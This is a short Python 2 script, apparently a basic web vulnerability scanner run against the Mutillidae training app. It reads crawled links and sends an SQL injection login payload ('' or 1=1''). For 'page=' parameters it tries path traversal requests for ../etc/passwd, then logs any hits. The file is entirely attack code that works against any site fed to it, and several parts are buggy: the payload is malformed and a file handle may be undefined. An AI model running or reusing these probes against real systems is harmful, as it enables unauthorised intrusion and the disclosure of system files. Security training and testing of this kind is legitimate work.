import urllib
import urlparse
import urllib2
import re


def read_file(name):

    root_folder = 'sites'
    path = root_folder + "/" + name + "/" + "crawled.txt"

    f = open(path, 'r')

    for line in f:
        #print(line)
        sql_inject(name, line)


"""
SQL injection Function
"""

def sql_inject(name, link):

    root_folder = 'sites'
    path = root_folder + "/" + name + "/" + "crawled.txt"

    print("Starting SQL Injection....")

    errors = ["MySQl", "error in your SQL"]

    print("[-] Testing Errors: "+link)
    data = urllib.urlencode({"username": "' or 1=1'", "password": "' or 1=1'"})
    request = urllib.urlopen(link, data)
    page = request.read()

    newfile = root_folder + "/" + name + "/" + "sqli.txt"

    for x in errors:
        if x in page:
            g = open(newfile, 'a')

            g.write(
                "\033[01;31mVulnerability Found in: \033[00m\n"
                "\033[01;31m[*] SQL Injection Found : "+link + "\033[00m\n"
            )

"""
Path Traversal Function
"""


def path_traversal(name):

    root_folder = 'sites'
    path = root_folder + "/" + name + "/" + "crawled.txt"

    f = open(path, 'r')

    for line in f:

        contains = "root:"
        if "page=" in line:

            newfile = root_folder + "/" + name + "/" + "pathtraversal.txt"
            g = open(newfile, "a")
            page = "page=".join(line.split("page=")[:-1])

            q1 = page+"page=../etc/passwd"
            request = urllib.urlopen(q1)
            res = request.read()

            if contains in res:

                found = "\033[01;31m[+] Path Traversal Found : " + q1 + "\033[00m\n"
                g.write(found + "\n")
                print(found)

            else:
                notfound = "[*] Path Traversal Not Found : " + q1
                g.write(notfound+"\n")
                print(notfound)

                q2 = page + "page=../../etc/passwd"
                request = urllib.urlopen(q2)
                res2 = request.read()
                if contains in res2:
                    found = "\033[01;31m[+] Path Traversal Found : " + q2 + "\033[00m\n"
                    g.write(found + "\n")
                    print(found)

                else:
                    notfound = "[*] Path Traversal Not Found : " + q2
                    g.write(notfound + "\n")
                    print(notfound)

                    q3 = page + "page=../../../etc/passwd"
                    request = urllib.urlopen(q3)
                    res3 = request.read()
                    if contains in res3:
                        found = "\033[01;31m[+] Path Traversal Found : " + q3 + "\033[00m\n"
                        g.write(found + "\n")
                        print(found)


                    else:
                        notfound = "[*] Path Traversal Not Found : " + q3
                        g.write(notfound + "\n")
                        print(notfound)
        g.close()

path_traversal("MUTILLIDAE")